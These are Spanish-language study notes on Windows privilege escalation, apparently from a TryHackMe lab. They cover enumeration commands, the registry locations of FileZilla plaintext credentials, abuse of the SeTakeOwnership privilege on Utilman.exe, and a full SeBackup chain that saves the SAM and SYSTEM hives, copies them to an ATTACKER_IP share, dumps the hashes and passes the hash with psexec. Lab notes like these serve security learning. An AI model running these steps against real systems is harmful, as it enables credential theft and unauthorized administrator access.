# Credenciales en texto plano 
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\xampp\FileZilla Server\FileZilla Server.xml


## Enumerar crontabs 

schtasks /query /tn TASK_NAME /fo list /v



## Verificar permisos en archivos 

icacls FILE



## Archivos msi configurados 
Sin archivos que se ejecutan con permisos del usuario que los lanza.
Pero pueden estar configurados para ejecutarse con permisos de otro usuario.
La información se encuentra en la siguientes registros.
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

## Buscar los Grupos miembros del usuario
net user USERNAME


## Windows Services 

Service Control Manager (SCM)
    Es el proceso que carga y mantiene el estado de los servicios de windows.
    Mostrar el path de los servicios y el nombre del servicio que inicia.
    ## Para enumerarlo se usa el comando **sc qc ** sc query configuration
        sc qc apphostsvc
    ## Para detener/lanzar el servicio 
        sc stop service
        sc start service
    Las configuraciones de los registros son almacenadas en:
        HKLM\SYSTEM\CurrentControlSet\Services\


## Abusando de privilegios peligrosos
    Enumeracion se realiza:
        whoami /priv
    * SeBackup / SeRestore
        * Lectura y escritura en cualquier archivo en el sistema
        
        1. Enumerar
             whoami /priv
        2. Mover datos del registro 
            reg save hklm\system C:\Users\THMBackup\system.hive
            reg save hklm\sam C:\Users\THMBackup\sam.hive
        3. Mover datos del registo a local
            # Atacante 
            /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
            # Target
            copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
            copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
        4. Dumpeamos los hashes
            /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
        5. Nos autenticamos con el hash (pass the hash)
            /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.39.112

    * SeTakeOwnership
        *Le permite a un usuario tomar posesión de cualquier objeto en el sistema

        1. Enumeracion
            whoami /priv
        2. Explotación
            
            takeown /f C:\Windows\System32\Utilman.exe













## Crear un smb para compartir archivos 

/opt/impacket/examples/smbserver.py -smb2support -username user -password pass public share













